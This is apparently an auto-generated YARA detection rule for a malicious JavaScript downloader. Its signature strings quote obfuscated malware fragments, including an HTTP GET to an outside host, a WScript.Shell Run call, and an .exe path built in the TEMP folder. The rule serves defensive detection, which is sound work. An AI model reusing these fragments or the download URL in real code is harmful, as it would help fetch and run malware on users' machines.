rule sig_20160330_428825a9db2a644bf712ddb666ab8741 {
  meta:
    description = "datamaliciousorder - file 20160330_428825a9db2a644bf712ddb666ab8741.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "df05549da70472303777192122995ab5ee40ec2223c491e7e3fb6e9dda28b884"

  strings:
    $s1  = "_JP[_NO](\"GET\", \"http://zakazdetali.kz/v7bsad\", false);" fullword ascii
    $s2  = "var _W0 = function _Y() {return WScript[_W](\"WScript\"+\".Shell\");}(), _SY = 11;" fullword ascii
    $s3  = "function _OL(_OA, _I){_L = _L * 1; return _OA - _I;};" fullword ascii
    $s4  = "if (_JP[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _HD(){return _RC + \"\";};" fullword ascii
    $s6  = "function _II() {return ((_K0 == true) && (_K0 == _F2)) ? 1 : _L;};" fullword ascii
    $s7  = "function _KK(_P){_W0[\"Run\"](_P, _L, _L);};" fullword ascii
    $s8  = "function _M() {return _W0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"b0ocahoGVM6O.ex\" + \"e\";};" fullword ascii
    $s9  = "function _S(_H) {var _O0 = (1, 2, 3, 4, 5, _H); return _O0;};" fullword ascii
    $s10 = "function _EG(){return 22;};" fullword ascii
    $s11 = "var _WU = new this[\"Date\"]();" fullword ascii
    $s12 = "function _F0(){return _W;};" fullword ascii
    $s13 = " while (_ZR){" fullword ascii
    $s14 = "return _OL(_K, _QW);" fullword ascii
    $s15 = "function _F()" fullword ascii
    $s16 = "var _S0 = false;" fullword ascii
    $s17 = "_F2 = true; " fullword ascii
    $s18 = "var _F2 = false;" fullword ascii
    $s19 = "var _K0 = false;" fullword ascii
    $s20 = "_K0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}